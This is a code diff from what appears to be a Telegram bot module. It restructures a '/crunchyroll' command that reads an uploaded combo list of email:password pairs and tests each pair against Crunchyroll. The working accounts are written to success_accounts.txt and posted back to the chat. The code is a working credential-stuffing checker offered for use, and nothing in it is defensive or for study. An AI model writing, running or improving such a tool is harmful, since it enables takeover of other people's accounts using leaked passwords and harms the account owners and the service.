@@ -68,62 +68,56 @@ class CrunchyrollChecker:
             return "free"
 
 
-async def crunchyroll_helper_command(app: Client, message: Message):
-    if message.reply_to_message and message.reply_to_message.document:
-        document = await app.download_media(message.reply_to_message.document)
-
-        with open(document, "r") as file:
-            content = file.read()
-
-        combos = re.findall(r"[\w\.]+@[\w\.]+:[\S]+", content)
-
-        if combos:
-            total_combos = len(combos)
-            checked_combos = 0
-            success_count = 0
-            invalid_count = 0
-            success_accounts = []
-
-            progress_text = "Crunchyroll Checking..."
-            progress_message = await message.reply_text(progress_text)
-
-            for combo in combos:
-                email, password = combo.split(":")
-                checker = CrunchyrollChecker(email, password)
-                status = checker.check_credentials()
-
-                checked_combos += 1
-
-                if status == "hit":
-                    success_count += 1
-                    success_accounts.append(f"{email}:{password}")
-
-                progress_text = f"Crunchyroll Checking... ({checked_combos}/{total_combos})"
-                await progress_message.edit_text(progress_text)
-
-            await progress_message.delete()
-
-            if success_accounts:
-                with open("success_accounts.txt", "w") as file:
-                    file.write("\n".join(success_accounts))
-                await app.send_document(message.chat.id, document="success_accounts.txt")
-                os.remove("success_accounts.txt")
-
-            os.remove(document)
-
-        else:
-            await message.reply_text("No valid email:password combos found.")
-
-    else:
-        await message.reply_text("Please reply with a valid combo.txt file.")
-
-
-def save_results(filename, combos):
-    with open(filename, "w") as file:
-        file.write("\n".join(combos))
-
-
 def register(app):
     @app.on_message(filters.command("crunchyroll"))
-    async def crunchyroll_command(_, message):
-        await crunchyroll_helper_command(app, message)
+    async def crunchyroll_helper_command(app: Client, message: Message):
+        if message.reply_to_message and message.reply_to_message.document:
+            document = await app.download_media(message.reply_to_message.document)
+
+            with open(document, "r") as file:
+                content = file.read()
+
+            combos = re.findall(r"[\w\.]+@[\w\.]+:[\S]+", content)
+
+            if combos:
+                total_combos = len(combos)
+                checked_combos = 0
+                success_count = 0
+                invalid_count = 0
+                success_accounts = []
+
+                progress_message = await message.reply_text("<b>⎚ `Crunchyroll Checking...`</b>")
+
+                for combo in combos:
+                    email, password = combo.split(":")
+                    checker = CrunchyrollChecker(email, password)
+                    status = checker.check_credentials()
+
+                    checked_combos += 1
+
+                    if status == "hit":
+                        success_count += 1
+                        success_accounts.append(f"{email}:{password}")
+
+                    progress_text = f"Crunchyroll Checking... ({checked_combos}/{total_combos})"
+                    await progress_message.edit_text(progress_text)
+
+                await progress_message.delete()
+
+                if success_accounts:
+                    with open("success_accounts.txt", "w") as file:
+                        file.write("\n".join(success_accounts))
+                    await app.send_document(message.chat.id, document="success_accounts.txt")
+                    os.remove("success_accounts.txt")
+
+                os.remove(document)
+
+            else:
+                await message.reply_text("<b>No valid email:password combos found.</b>")
+
+        else:
+            await message.reply_text("<b>Please reply with a valid combo.txt file.</b>")
+
+    def save_results(filename, combos):
+        with open(filename, "w") as file:
+            file.write("\n".join(combos))
